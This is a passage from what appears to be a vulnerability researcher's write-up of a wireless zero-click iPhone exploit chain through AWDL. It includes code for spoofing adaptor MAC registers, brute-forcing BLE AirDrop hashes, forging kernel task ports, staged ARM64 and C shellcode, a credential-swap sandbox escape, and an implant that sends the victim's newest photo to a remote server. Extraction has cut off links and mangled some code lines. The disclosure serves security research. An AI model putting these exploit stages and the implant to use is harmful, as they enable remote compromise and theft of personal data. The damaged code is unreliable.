The current supported interface is [netlink]( It took a whole day to learn enough about netlink to write a standalone PoC to change a MAC address. Netlink is presumably very powerful but also quite obtuse. And even after all that (perhaps unsurprisingly) it's no faster than the command line tool which is really just making these same netlink API calls too.
Check out change_mac_nl.c in the released exploit source code to see the netlink code.
Three ways to set a MAC: 3 - hacker
Trying to do this the supported way has failed, it's just way too slow. But thinking about it, what is the MAC anyway? It's almost certainly just some field stored in flash or RAM on the chipset and yes, diving in to the [mt76x2u linux kernel driver source]( and tracing the functions which set the MAC address we can see that ends up writing to some configuration registers on the chip:
 MT_MAC_ADDR_DW00x1008
 MT_MAC_ADDR_DW10x100c
void mt76x02_mac_setaddr(struct mt76x02_dev *dev, const u8 *addr)
static const u8 null_addr[ETH_ALEN] = {};
int i;
ether_addr_copy(dev->mt76.macaddr, addr);
if (!is_valid_ether_addr(dev->mt76.macaddr)) {
"Invalid MAC address, using random address %pM\n",
get_unaligned_le16(dev->mt76.macaddr + 4) |
FIELD_PREP(MT_MAC_ADDR_DW1_U2ME_MASK, 0xff));
I wonder if I could just write directly to those configuration registers? Would it completely blow up? Or would it just work? Is there an easy way to do this or will I have to patch the driver?
Looking around the driver a bit we can see it has a [debugfs]( interface. Debugfs is a very neat way for drivers to easily expose lots of internal stuff out to userspace, restricted to root, for logging and monitoring as well as for messing around with:
root at raspberrypi:/sys/kernel/debug/ieee80211/phy7/mt76# ls
agc ampdu_stat dfs_stats edcca eeprom led_pin queues rate_txpower regidx regval temperature tpc tx_hang_reset txpower
What we're after is a way to write to arbitrary control registers, and these two debugfs files let you do exactly that:
# cat regidx
# cat regval
If you write the address of the configuration register you want to read or write to the regidx file as a decimal value then reading or writing the regval file lets you read or write that configuration register as a 32-bit hexadecimal value. Note that exposing configuration registers this way is a feature of this particular driver's debugfs interface, not a generic feature of debugfs. With this we can completely skip the netlink interface and the requirement to bring the device down and instead directly manipulate the internal state of the adaptor.
I replace the netlink code with this:
void mt76_debugfs_change_mac(char* phy_str, struct ether_addr new_mac) {
union mac_dwords {
struct ether_addr new_mac;
uint32_t dwords[2];
} data = {0};
data.new_mac = new_mac;
char lower_dword_hex_str[16] = {0};
snprintf(lower_dword_hex_str, 16, "0x%08x\n", data.dwords[0]);
char upper_dword_hex_str[16] = {0};
snprintf(upper_dword_hex_str, 16, "0x%08x\n", data.dwords[1]);
char* regidx_path = NULL;
char* regval_path = NULL;
file_write_string(regidx_path, "4104\n");
file_write_string(regval_path, lower_dword_hex_str);
file_write_string(regidx_path, "4108\n");
file_write_string(regval_path, upper_dword_hex_str);
and... it works! The adaptor instantly starts ACKing frames to whichever MAC address we write in to the MAC address field in the adaptor's configuration registers.
All that's then required is a rewrite of the early read code:
Now it starts out steering 8 stalled peers. Each time a read is requested, if there's still time left before steering will timeout and there are still stalled peers, one stalled peer is chosen, has it's steering_msg_blob pointer corrupted with the read target and gets unstalled. The target will start sending UMIs to that peer, we set the correct MAC address on the active monitor device, sniff the UMI and ACK it to stop the peer sending more. From the UMI we extract the value from TLV 0x1d and get the disclosed kernel memory.
If there are no more stalled peers, or steering has timed out, we wait a safe amount of time until we're able to restart all 8 peers and start again:
struct ether_addr reader_peers[8];

struct ether_addr dst;

With some luck we can bootstrap the faster read primitive with 8 or fewer early reads which means on an iPhone 11 Pro with AWDL enabled popping calc now looks like this:
In this demo AWDL has been manually enabled by opening the sharing panel in the Photos app. This keeps the AWDL interface active. The exploit gains arbitrary kernel memory read and write within a few seconds and is able to inject a signal into a userspace process to cause it to JOP to a single gadget which opens Calculator.app
Zero clicks
I mentioned that AWDL has to be enabled, it isn't always on. In order to make this an interactionless zero-click exploit which can target any device in radio proximity we therefore need a way to force devices to enable their AWDL interface.
AWDL is used for many things. For example, my iPhone seems to turn on AWDL when it receives a voicemail because it really wants to Airplay the voicemail to my Apple TV. But sending someone a voicemail requires their phone number, and we're looking for an attack which requires no identifiers or non-default settings.
The [second research paper from the SEEMOO labs team]( demonstrated an attack to enable AWDL using Bluetooth low energy advertisements to force arbitrary devices in radio proximity to enable their AWDL interfaces for Airdrop. SEEMOO didn't publish their code for this attack so I decided to recreate it myself.
Enabling AWDL
In the iOS photos app when you select the sharing dialog and click "Airdrop" a list of iOS and MacOS devices nearby appears, all of which you can send your photo to. Most people don't want random passers-by sending them unsolicited photos so the default AirDrop sharing setting is "Contacts Only" meaning you will only see AirDrop sharing requests from users in your contacts book. But how does this work? For an in-depth discussion, check out the SEEMOO labs paper.
When a device wants to share a file via AirDrop it starts broadcasting a [bluetooth low-energy advertisements]( which looks like this example, broadcast by MacOS:
[PACKET] [ CH:37|CLK:1591031840.920892|RSSI:-44dBm ] << BLE - Advertisement Packet | type=ADV_IND | addr=28:C4:72:91:05:D7 | data=02010617ff4c000512000000000000000001297f247ee56f62b300 >>
BLE advertisements are small, they have a maximum payload size of 31 bytes. The bundle of bytes at the end are actually four truncated 2-byte SHA256 hashes of the contact information of the device which is trying to share something. The contact information used are the email addresses and phone numbers associated with the device's logged-in iCloud account. You can generate the same truncated hashes like this:
In this case I'm using a test account with the iCloud email address: 'chris.donut1981 at icloud.com'
Notice that this matches the two penultimate bytes in the advertisement frame shown above. The contact hashes are unsalted which [can have some fun consequences if you live in a country with localized mobile phone numbers]( but this is an understandable performance optimization.
All iOS devices are constantly receiving and processing BLE advertisement frames like this. In the case of these AirDrop advertisements, when the device is in the default "Contacts Only" mode, sharingd (which parses BLE advertisements) checks whether this unsalted, truncated hash matches the truncated hashes of any emails or phone numbers in the device's address book.
If a match is found this doesn't actually mean the sending device really is in the receiver's address book, just that there is a contact with a colliding hash. In order to resolve this the devices need to share more information and at this point the receiver enables AWDL to establish a higher-bandwidth communication channel.
The SEEMOO labs paper continues in great detail about how the two devices then really verify that the sender is in the receiver's address book, but we are only trying to get AWDL enabled so we're done. As long as we keep broadcasting the advertisement with the colliding hash the target's AWDL interface will remain active.
Blue in the teeth
The SEEMOO labs team paper discusses the custom firmware they wrote for a BBC micro:bit so I picked up a couple of those:
The BBC micro:bit is an education-focused dev board. This photo shows the rear of the board; the front has a 5x5 LED matrix and two buttons. They cost under $20.
These devices are intended for the education/maker market. It's a [Nordic nRF51822 SOC]( with a [Freescale KL26]( acting as a USB programmer for the nRF51. BBC provide a small programming environment for it, but you can build any firmware image for the nRF51, plug in the micro:bit which appears as a mass-storage device thanks to the KL26 and drag and drop the firmware image on there. The programmer chip flashes the nRF51 for you and you can run your code. This is the device which the SEEMOO labs team used and wrote a custom firmware for.
Whilst playing around with the micro:bit I discovered the [MIRAGE]( project, a generic and amazingly well documented project for doing all manner of radio security research. Their tools have a firmware for the micro:bit, and indeed, dropping their provided firmware image on to the micro:bit and running this:
sudo ./mirage_launcher ble_sniff SNIFFING_MODE=advertisements INTERFACE=microbit0
we're able to start sniffing BLE advertisements:
[PACKET] [ CH:37|CLK:1591006615.511192|RSSI:-46dBm ] << BLE - Advertisement Packet | type=ADV_IND | addr=58:6A:80:4F:41:74 | data=02011a020a0707ff4c000f020000 >>
Indeed, if you do this at home you'll likely see a barrage of BLE traffic from everything imaginable. Apple devices are particularly chatty, notice the frames sent each time your Airpods case is open and closed.
If we take a look at a couple of captured BTLE frames when we try to share a file via AirDrop, we can see there's clearly structure in there:

Definitely looks like more TLVs! With some reversing in sharingd we can figure out what these types are:
"Invalid" 0x0

"Company" 0x2
"AirPrint" 0x3
"ATVSetup" 0x4
"AirDrop" 0x5

MacOS is sending AirDrop messages in the BLE advertisements. iOS is sending NearbyAction and NearbyInfo messages.
Brute forcing SHA256, or two bytes of it at least
For testing purposes we want some contacts on the device. Like the SEEMOO labs paper I generated 100 random contacts using a modified version of the [AppleScript in this StackOverflow answer]( Each contact has 4 contact identifiers: home and work email, home and work phone numbers.
We can also use MIRAGE to prototype brute forcing through the 16 bit space of truncated contact hashes. I wrote a MIRAGE module to broadcast Airdrop advertisements with incrementing truncated hashes. The MIRAGE micro:bit firmware doesn't support arbitrary broadcast frame injection but it is able to use the Raspberry Pi 4's built-in bluetooth controller. Running it for a while and looking at the console output from the iPhone we notice some helpful log messages showing up in Console.app:
Hashing: Error: failed to get contactsContainsShortHashes because (ratelimited)
The SEEMOO paper mentioned that they were able to brute force a truncated hash in a couple of seconds but it appears Apple have now added some rate limiting.
Spoofing different BT source MAC addresses didn't help but slowing the brute force attempts to one every 2 seconds or so seemed to please the rate limiting and in around 30 seconds, with average luck AWDL gets enabled and MI and PSF frames start to appear on the AWDL social channels.
As long as we keep broadcasting the same advertisement with the matching contact hash the AWDL interface will remain active. I didn't want to keep MIRAGE as a dependency so I ported the python prototype to use the linux native libbluetooth library and [hci_send_cmd]( to build custom advertisement frames:
uint8_t payload[] = {0x02, 0x01, 0x06,
0x4c, 0x00,
0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x01,
hash1[0], hash1[1],
hash2[0], hash2[1],
hash3[0], hash3[1],
hash4[0], hash4[1],
le_set_advertising_data_cp data = {0};
data.length = sizeof(payload);
memcpy(data.data, payload, sizeof(payload));
Popping calc with zero clicks
Combining the AWDL exploit and BLE brute-force, we get a new demo:
With the phone left idle on the home screen and no user interaction we force the AWDL interface to activate using BLE advertisements. The AWDL exploit gains kernel memory read write in a few seconds after starting and the entire end to end exploit takes around a minute.
There may well be better, faster ways to force-enable AWDL but for my demo this will do.
Let's run an implant!
This demo is neat but really doesn't convey that we've compromised almost all the user's data, with no interaction. We can read and write kernel memory remotely. I know that Apple has invested significant effort in "post-exploitation" hardening so I wanted to demonstrate that with just this single vulnerability these could be defeated to the point where I could run something like a real-world implant which we've seen being [deployed in real world exploitation against end users before]( Trying to defend against an attacker with arbitrary memory read/write is a losing game, but there's a difference between saying that and you believing me, and proving it.
Speedy writer
We're going to need to write much more arbitrary data for this final step, so we need the arbitrary write to be even faster. There's one more optimization left.
Due to the order in which loads and stores occur in actionFrameReport we were able to build a primitive which gave us a timestamp valid for up to 1024ms and a large n_frames_in_last_second value. We used that to do one arbitrary add, then restarted the whole setup: replaced upper_peer's timestamp with 0, sent another frame to get a fresh timestamp and so on.
But why can't we just keep using the first timestamp and bundle more writes together? We can, it's just very important to take care that we don't exceed that 1024ms window. The exploit takes a very conservative approach here and uses only a few extra milliseconds. The reason is that we're running as a regular userspace program on a small system. We don't have anything like real-time scheduling guarantees. [Linux kind-of supports running userspace programs on isolated cores]( to give something like a real-time experience, but for getting this demo exploit running it was sufficient to boost the priority of the exploit process with nice and leave a large safety window in the 1024ms. The code tries to bundle large buffer writes in chunks of 16 which provides a reasonable speed up.
Way back when I released the first demo exploit which disclosed random chunks of physical memory I had taken a look at how the physmap works on iOS.
Linux, Windows and XNU all have physmaps; they are a very convenient way of manipulating physical memory when your code has paging enabled and can't directly manipulate physical memory any more.
Abstractly, physmaps are virtual mappings of all of physical memory
The physmap is (typically) a 1:1 virtual mapping of physical memory. You can see in the diagram how the physical memory at the bottom might be split up into different regions, with some of those regions currently mapped in the kernel virtual address space. Some other physical memory regions might for example be used for userspace processes.
The physmap is the large kernel virtual memory region shown towards the right of the virtual address space, which is the same size as the amount of physical memory. The pagetables which translate virtual memory accesses in this region are set up in such a way that any access at an offset into the physmap virtual region gets translated to that same offset from the base of physical memory.
The physmap in XNU isn't set up exactly like that. Instead they use a "segmented physical aperture". In practise this means that they set up a number of smaller "sub-physmaps" inside the physmap region and populate a table called the PTOV table to allow translation from a physical address to a virtual address inside the physmap region:
pa: 0x000000080e978000 kva: 0xfffffff070928000 len: 0xde03c000 (3.7GB)
pa: 0x0000000808e14000 kva: 0xfffffff06ade4000 len: 0x05b44000 (95MB)
pa: 0x0000000801b80000 kva: 0xfffffff066000000 len: 0x04cb8000 (80MB)
pa: 0x0000000808d04000 kva: 0xfffffff06acf4000 len: 0x000f0000 (1MB)
pa: 0x0000000808df4000 kva: 0xfffffff06acd4000 len: 0x00020000 (130kb)
pa: 0x0000000808cec000 kva: 0xfffffff06acbc000 len: 0x00018000 (100kb)
pa: 0x0000000808a80000 kva: 0xfffffff06acb8000 len: 0x00004000 (16kb)
pa: 0x0000000808df4000 kva: 0xfffffff06acf4000 len: 0x00000000 (0kb)
There's one more important physical region not captured in the PTOV table which is the kernelcache image itself; this is found starting at gVirtBase and the kernel functions for translating between physical and physmap-virtual addresses take this into account.
The interesting thing is that the virtual protection of the pages in the physmap doesn't have to match the virtual protection of the pages as seen by a page table traversal from the perspective of a task. I wrote some test code using oob_timestamp to overwrite a portion of its own __TEXT segment in the physmap and it worked, allowing me to execute new native instructions. Could we execute userspace shellcode remotely by writing just directly into the physmap?
What happened to my physmap?
This works fine when prototyped using oob_timestamp modifying itself; but if you try to use it to target a system process, it panics. Something else is going on.
APRR, PPL and pmap_cs.
The canonical resource for [APRR is s1guza's blog post]( It's a hardware customization by Apple to add an extra layer of indirection to page protection lookups via a control register. The page-tables alone are no longer enough to determine the runtime memory protection of a page.
APRR is used in the Safari JIT hardening and in the kernel it's used to implement PPL (Page Protection Layer). For an [in-depth look at PPL check out Brandon Azad's recent blog post](
PPL uses APRR to dynamically switch the page protections of two kernel regions, a text region containing code and a data region. Normally the PPL text region is not executable and the PPL data region is not writable. Important data structures have been moved into this PPL data region, including page tables and pmaps (the abstraction layer above page tables). All the code which modifies objects inside PPL data has been moved inside the PPL text segment.
But if the PPL text is non-executable, how can you run the code to modify the PPL data regions? And how can you make them writable?
The only way to execute the code inside the PPL text region is to go through a trampoline function which flips the APRR register bits to make the PPL text region executable and the PPL data region writable before jumping to the provided ppl_routine. Obviously great care has to be taken to ensure only code inside PPL text runs in this state.
Brandon likened this to a "kernel inside the kernel" which is a good way to look at it. Modifications to page tables and pmaps are now meant to only happen by the kernel making "PPL syscalls" to request the modifications, with the implementation of those PPL syscalls being inside the PPL text region. Check out Brandon's blog post for discussion of how to exploit a vulnerability in the PPL code to make those changes anyway!
It turns out that it's not just page tables and pmaps which PPL protects. Reversing more of the PPL routines there's a section of them starting around routine 38 which are implementing a new model of codesigning enforcement called pmap_cs.
Indeed, this pmap_cs string appears in the released XNU source, though attempts have been made to strip as much of the PPL related code as possible from the open source release. The vm_map_entry structure has this new field:
From this code snippet from vm_fault.c it's pretty clear that pmap_cs is a new way to verify code signatures:
 PMAP_CS
if (fault_info->pmap_cs_associated &&
pmap_cs_enforced(pmap) &&
!m->vmp_cs_validated &&
!m->vmp_cs_tainted &&
!m->vmp_cs_nx &&
(prot & VM_PROT_EXECUTE) &&
(caller_prot & VM_PROT_EXECUTE)) {
* With pmap_cs, the pmap layer will validate the
* code signature for any executable pmap mapping.
* No need for us to validate this page too:
* in pmap_cs we trust...
} else {
 /* PMAP_CS */
 /* PMAP_CS */
vm_page_validate_cs is the old code-signing enforcement code, which can be easily tricked into allowing shellcode by changing the codesigning enforcement flags in the task's proc structure. The question is what determines whether the new pmap_cs model or the old approach is used?
A pmap_cs workaround
The fundamental question I'm trying to answer is why the physmap shellcode injection technique works for a test app I'm debugging, but not a system process, even when the system process's code signing flags have been modified such that it should be allowed to run unsigned code?
We can see a reference to pmap_cs_enforced in the snippet above but the definition of this method is stripped from the released XNU source code. With IDA we can see it's checking the byte at offset +0x108 in the pmap structure. Nowhere in the XNU code seems to manipulate this field though.
Reversing the pmap_cs PPL code we find that this field is referenced in pmap_cs_associate_internal_options, called by PPL routine 44.
This function has some helpful logging strings from which we can learn that it's being called to associate a code-signing structure with a virtual memory region. This code signing structure is a pmap_cs_code_directory, and we can determine from this panic log message:
if (trust_level != 3) {
panic("\"trying to enter a binary in nested region with too low trust level %d\"", cd_entry->trust_level);
that the field at +0x54 represents the "trust level" of the binary.
Further down the function we can see this:
if ( trust_level != 1 )
goto LABEL_38;
pmap->pmap_cs_enforced = 0;
return KERN_NOT_SUPPORTED;
Probably my test apps signed by my developer certificate are getting this trust_level of 1 and therefore falling back to the old code-signing enforcement code. I had a hunch that maybe this also applied to third-party applications from the App Store; rather than painstakingly continuing to reverse engineer pmap_cs I just tried installing and running an App Store app (in this case, YouTube) on the phone then using oob_timestamp to dump the pmap structures for each running process. Indeed, there were three pmaps with pmap_cs_enforced set to 0: kernel_task (not so interesting because [KTRR]( protects the kernel TEXT segment), oob_timestamp and YouTube!
This means that we can use the remote kernel read/write to inject shellcode into any third-party app running on the device. Of course, we don't want the prerequisite that the target needs to be running a third-party application, so we can use the technique developed earlier to open the calculator to instead spawn a third-party app. If the device doesn't have any third-party applications installed this technique wouldn't work, but we already have kernel memory read/write so there are many more avenues available for running code in some form on the device. But for now, we'll assume the target device has at least one App Store app installed.
Uploading payloads
Our arbitrary write is reasonably fast but still too slow for us to use it to write an entire payload into the physmap that way. Instead, let's create a staged loader.
We will try to write a minimal piece of initial shellcode via the physmap which will be run as the fake signal handler. Its only purpose will be to bootstrap a larger payload and jump to it. The idea will be to place fragments of our final payload in kernel memory which the bootstrap code will find, copy into userspace, make executable and jump to.
A useful memory leak
Earlier I discussed the service_response technique for building a heap groom. I noted that this was an almost perfect heap grooming primitive: we control the size of the allocations and can place arbitrary bytes at arbitrary offsets within them. I also noted that it seemed to be a true memory leak as even when the AWDL interface is disabled, the memory never gets freed.
This also seems like a great primitive for staging our payload. All we need to do is figure out the address of the leaked memory.
The parser for the service response TLV (type 2) which causes the memory wraps the kalloc'ed buffer in an IO80211ServiceRequestDescriptor object. The pointer to the buffer is at offset +0x40 in there.
The IO80211ServiceRequestDescriptor is then enqueued into an IO80211CommandQueue in the IO80211AWDLPeerManager at +0x2968 which I've called response_fragments:
The lockEnqueue method calls ::enqueue which will add the new element at the head of the queue's linked list if either of the two following checks pass:
if ( this->max_elems_per_bucket == 0x1000000 ||
this->max_elems_per_bucket * this->num_buckets > this->count )
If these checks fail the enqueue method returns an error, but the processServiceResponseTLV method never checks this error. The reason we get a true memory leak here is because the peer_manager's response_fragments queue is created with max_elems_per_bucket set to 8, meaning that after 8 incomplete fragments have arrived no more will be enqueued. The service response code doesn't handle this case and the return value of lockEnqueue isn't checked. The code no longer has a pointer to the RequestDescriptor and it cannot be freed. This is in some ways convenient for the heap groom, but not at all convenient when we want to know the address of the allocation!
Fixing the memory leak, sort of...
Using the arbitrary write we can increase the queue limit to a much higher value, and now our code works and we can, with just a few frames, place controlled buffers of up to around 1000 bytes in kernel memory and find their addresses by parsing the queue structure . Here's the wrapper function for this functionality in the exploit:
uint16_t kmem_leak_peer_id = 0;
copy_buffer_to_kmem(void* buf,
size_t len,
uint16_t kalloc_size,
uint16_t offset) {
struct ether_addr kmem_leak_peer =
*(((uint16_t*)&kmem_leak_peer)+2) = kmem_leak_peer_id++;
WIFI(kl_parm.dst, kmem_leak_peer),
SERV_RESP_KALLOCER(buf, len, kalloc_size, offset),
uint64_t serv_resp_q = rk64(kl_parm.peer_manager_kaddr+0x2968);
uint64_t buckets = rk64(serv_resp_q+0x48);
uint64_t elem = rk64(buckets+0x8);
uint64_t ptr = rk64(elem+0x40);
return ptr;
Giving shellcode kernel memory read/write
We're going to want our payload to be able to read and write kernel memory just like we already can remotely. The canonical way to do this is to give the code a send right to a task port representing the kernel task. There are some new mitigations around this in iOS 13 (and more in iOS 14) but they're easily worked around because we already have kernel read/write using a different primitive.
We find the real kernel vm_map, build a fake kernel task port object and task, ensuring the correct kalloc_zone magic values are in the right place, then use the upload primitive to place them in kernel memory and find the addresses:
uint64_t kern_proc = 0xFFFFFFF00941B818 + kaslr_slide;
uint64_t kern_task = rk64(kern_proc+0x10);
uint64_t kern_map = rk64(kern_task+0x28);
uint32_t fake_task_buf_size = 0x200;
uint8_t* fake_task_buf = malloc(fake_task_buf_size);
memset(fake_task_buf, 0, fake_task_buf_size);
*(uint16_t*)(fake_task_buf+0x16) = 0x39; // zone index for tasks
uint8_t* fake_task = fake_task_buf + 0x100;
*(uint64_t*)(fake_task+0x000) = 0; // lck_mtx_data
*(uint8_t*) (fake_task+0x00b) = 0x22; // lck_mtx_type
*(uint32_t*)(fake_task+0x010) = 4; // ref_cnt
*(uint32_t*)(fake_task+0x014) = 1; // active
*(uint64_t*)(fake_task+0x028) = kern_map; // map
uint64_t fake_task_buf_kaddr = copy_buffer_to_kmem(
uint64_t fake_task_kaddr = fake_task_buf_kaddr + 0x100;
uint64_t target_task_port = rk64(target_task + 0x108);
uint64_t ipc_space_kernel = rk64(target_task_port + 0x60);
uint32_t fake_port_buf_size = 0x200;
uint8_t* fake_port_buf = malloc(fake_task_buf_size);
memset(fake_port_buf, 0, fake_port_buf_size);
*(uint16_t*)(fake_port_buf+0x16) = 0x2a; // zone index for ipc ports
uint8_t* fake_port = fake_port_buf + 0x100;
*(uint32_t*)(fake_port+0x000) = 0x80000000 | 2; // ip_bits *(uint32_t*)(fake_port+0x004) = 4; // ip_references
*(uint64_t*)(fake_port+0x060) = ipc_space_kernel; // ip_receiver
*(uint64_t*)(fake_port+0x068) = fake_task_kaddr; // ip_kobject
*(uint32_t*)(fake_port+0x09c) = 1; // ip_mscount
*(uint32_t*)(fake_port+0x0a0) = 1; // ip_srights
uint64_t fake_port_buf_kaddr = copy_buffer_to_kmem(
uint64_t fake_port_kaddr = fake_port_buf_kaddr + 0x100;
We then need the stage0 code to be able to use this fake port. [Canonically you would set this port as host special port 4]( which the shellcode could then retrieve like this:
The issue is this requires a send right to the host_priv port, which the app we're injecting the shellcode into won't have. Jailbreaks sometimes work around this by making the regular host port into the host_priv port, but we don't want to do that as it also weakens some sandboxing primitives.
One option would be to add the port into the task's port namespace directly but this is a little fiddly. Instead, I chose to use a task special port. These are per-task ports, pointers to which are stored in the task struct:
struct task {
struct ipc_port *itk_host; /* a send right */
struct ipc_port *itk_bootstrap; /* a send right */
struct ipc_port *itk_seatbelt; /* a send right */
struct ipc_port *itk_gssd; /* yet another send right */
struct ipc_port *itk_debug_control; /* send right for debugmode communications */
struct ipc_port *itk_task_access; /* and another send right */
struct ipc_port *itk_resume; /* a receive right to resume this task */
struct ipc_port *itk_registered[TASK_PORT_REGISTER_MAX];
I chose to use task special port 7 which is the now unused TASK_SEATBELT_PORTitk_seatbelt.
We use our remote kernel read/write to write the fake kernel task pointer there:
wk64(target_task+0x2e0, fake_port_kaddr);
Then the stage0 shellcode just has to do:
mach_port_t kernel_task = MACH_PORT_NULL;
task_get_special_port(mach_task_self(), 7, &kernel_task);
to get a send right to a functional kernel task port and gain local kernel memory read/write.
A shellcode framework: stage0
We're going to use the remote kernel memory read to find a victim process, traverse that victim process's page tables to find the physical address of a TEXT page (we'll use the first page of the binary). We'll then find the address of the mapping of that physical page in the physmap and use the remote kernel memory write to write a shellcode stub in there. We'll use the same fake-signal injection technique to force the victim process to jump to the start of our shellcode.
Since our remote kernel memory write is relatively slow (dozens of bytes a second) we don't want to inject our entire payload this way, instead we'll split it into multiple stages with stage0 being the only stage injected in this way. stage0's only purpose is to bootstrap a second, larger stage1. Here's the assembly of stage0:
.section __TEXT,__text
; save sigreturn context:
mov x20, x4
; save sigreturn token:
mov x21, x5
; retrieve tfp0
sub sp, sp, ldr w0, task_self_name
mov w1,  ; TASK_SEATBELT_PORT
mov x2, sp
ldr x8, task_get_special_port
blr x8
ldr w19, [sp] ; tfp0!
; read stage1 into userspace
mov w0, w19
ldr x1, stage1_kaddr
ldr w2, stage1_size
mov x3, sp
add x4, sp, ldr x8, mach_vm_read
blr x8
; write stage1 into physmap
mov w0, w19

mov w1, ldr x8, sys_icache_invalidate
blr x8
; jump to stage1
mov w0, w19 ; tfp0
mov x1, x20 ; sigreturn context
mov x2, x21 ; sigretun token
ldr x8, stage1_uaddr
blr x8
.word 0x49494949
.word 0x43434343
.quad 0x4141414141414141
.quad 0x4242424242424242
.quad 0x4646464646464646
.quad 0x4747474747474747
.quad 0x4848484848484848
.quad 0x4b4b4b4b4b4b4b4b
.quad 0x4a4a4a4a4a4a4a4a
This could probably be smaller but will do for a demo.
At the bottom are constants; they'll get replaced by the exploit code just before they get written into the physmap. The exploit knows the userspace ASLR shift so is able to replace them with the correct runtime symbol values.
The shellcode retrieves the send right to the fake kernel task port we placed as task special port 7, uses it to read stage1 and immediately write it to the physmap. The last thing it does is invalidate the instruction cache by calling sys_icache_invalidate then it jumps to stage1:
Writing assembly is fun, for a bit. We really want to run code written in C as soon as possible. With a bit of care it is possible to write shellcode in C. To make things as simple as possible for the loader we will have no external linkage (you can't directly call any library functions) and no global variables. We want a binary where we can extract the text and cstring sections, jump to the start of the text and it will run.
We do of course want to be able to call library functions which can be done with some macro hackery:
 F(name, ...) \
((typeof(name)*)(_dlsym(RTLD_DEFAULT, This allows us to call arbitrary functions using a cstring of their name via dlsym, with the correct prototype. For example, varargs function will still work:
F(printf, "%s %d hello\n", foo, 123);
For this we will need one global variable; we don't want a data segment so we force it to be in __TEXT,__text:
 FSYM(name) \
typeof(name)* _ __attribute__ ((section("__TEXT,__text"))) = (void*)(0x4141414141414141);
This symbol will again be resolved by the exploit and replaced before stage1 is uploaded.
We define one more symbol, kdata, which we set to point to a configuration structure we also upload into the kernel heap somewhere. This configuration structure tells stage1 where to find the chunks which make up stage 2 so it can be rebuilt:
struct kconf {
uint64_t kaslr_slide;
uint32_t kbuf_size;
uint32_t n_text_fragments;
uint64_t text_fragments[100];
Here's stage1:
start(mach_port_t tfp0,
void* sigreturn_context,
void* sigreturn_token) {
F(asl_log, NULL, NULL, ASL_LEVEL_ERR, "hello from stage1!");
struct kconf kc;
mach_vm_size_t out_size;
sizeof(struct kconf),
uint32_t total_size = kc.n_text_fragments*1024;
total_size += 0x3fff;
total_size &= (~0x3fff);
mach_vm_address_t base;
mach_port_t self = F(task_self_trap);
for (uint32_t i = 0; i < kc.n_text_fragments; i++) {
uint64_t needle = 0x4141414141414141;
volatile uint64_t* stage2_dlsym_addr = F(memmem,
*stage2_dlsym_addr = _dlsym;
VM_PROT_READ | VM_PROT_EXECUTE);
void (*stage2)(mach_port_t, void*) = base;
stage2(tfp0, kdata);
We have a bit more leeway with the size of stage1; it can be up to around 1000 bytes.
It reads the configuration structure from the kernel, allocates memory for the final payload then reads in each chunk to the right place, sets the page protection accordingly and jumps to the final payload.
Escaping the sandbox from the outside
We've now removed any size restrictions on our payload so are free to write more complex code. The first step is to unsandbox the process we've ended up in. We can do this by replacing our credential structure with that of a more privileged process:
uint64_t kaslr_slide = r64(tfp0, kc+offsetof(struct kconf, kaslr_slide));
pid_t our_pid = F(getpid);
pid_t launchd_pid = 1;
uint64_t our_proc = 0;
uint64_t launchd_proc = 0;
uint64_t proc = r64(tfp0, 0xFFFFFFF00941C940+kaslr_slide);
for (int i = 0; i < 1024; i++) {
pid_t pid = r32(tfp0, proc+0x68);
if (pid == our_pid) {
our_proc = proc;

w64(tfp0, our_proc+0x100, launchd_ucred);
We're still bound by the global [platform_profile sandbox]( but this is enough to grant access to almost all user data.
A minimal implant
At this point we basically have unfettered access to user data; we can read emails, private messages, photos, contacts, stream the camera and audio live and so on. I don't want to spend another month writing a fully-featured implant though so I decided to just steal the most recently taken photo:
Reading some mobile forensics websites we can see that iOS stores photos taken by the camera in /private/var/mobile/Media/DCIM/100APPLE.
We can use the unix readdir API to enumerate that directory and find the most recently created file with the extension .HEIC:
 timespec_cmp(a, b, CMP) \
( ((a)->tv_sec == (b)->tv_sec) ? \
((a)->tv_nsec CMP (b)->tv_nsec) : \
((a)->tv_sec CMP (b)->tv_sec))
struct dirent* ep;
while (ep = F(readdir, dp)) {
F(asl_log, NULL, NULL, ASL_LEVEL_ERR, ep->d_name);
if (!F(strstr, ep->d_name, ".HEIC")) {
char* fullpath;
F(asprintf, &fullpath, "%s/%s", dirpath, ep->d_name);
struct stat st;
F(stat, fullpath, &st);
if (timespec_cmp(&st.st_birthtimespec, &newest_timespec, >)) {
newest_photo_path = fullpath;
newest_timespec = st.st_birthtimespec;
} else {
F(free, fullpath);
Then we just create a TCP socket, connect to a server we control and write the contents of that file to the socket:
int sock = F(socket, PF_INET, SOCK_STREAM, 0);
struct sockaddr_in addr = {0};
addr.sin_family = PF_INET;
addr.sin_port = htons(1234);
addr.sin_addr.s_addr = F(inet_addr, "10.0.1.2");
int conn_err = F(connect,sock, &addr, sizeof(addr));
if (conn_err) {
F(asl_log, NULL, NULL, ASL_LEVEL_ERR, "connect failed");
F(sleep, 1000);
size_t photo_size = 0;
char* photo_buf = load_file(newest_photo_path, &photo_size);
F(write,sock, photo_buf, photo_size);
F(close, sock);
Process continuation
stage0 saved the sigreturn context and token which can now be used to let this thread continue safely. A real implant could now continue running in a separate thread and perform the necessary cleanup in the kernel to ensure AWDL can be safely disabled and the implant can continue to run in the background. For us this is where the journey ends.
End-to-end demo
This demo shows the attacker successfully exploiting a victim iPhone 11 Pro device located in a different room through a closed door. The victim is using the Youtube app. The attacker forces the AWDL interface to activate then successfully exploits the AWDL buffer overflow to gain access to the device and run an implant as root. The implant has full access to the user's personal data, including emails, photos, messages, keychain and so on. The attacker demonstrates this by stealing the most recently taken photo. Delivery of the implant takes around two minutes, but with more engineering investment there's no reason this prototype couldn't be optimized to deliver the implant in a handful of seconds.
My exploit is pretty rough around the edges. With some proper engineering and better hardware, once AWDL is enabled the entire exploit could run in a handful of seconds. There are likely also better techniques for getting AWDL enabled in the first place rather than the hash bruteforce. My goal was to build a compelling demo of what can be achieved by one person, with no special resources, and I hope I've achieved that.
There are further aspects I didn't cover in this post: AWDL can be remotely enabled on a locked device using the same attack, as long as it's been unlocked at least once after the phone is powered on. The vulnerability is also wormable; a device which has been successfully exploited could then itself be used to exploit further devices it comes into contact with.
The inevitable question is: But what about the next silver bullet: memory tagging (MTE)? Won't it stop this from happening?
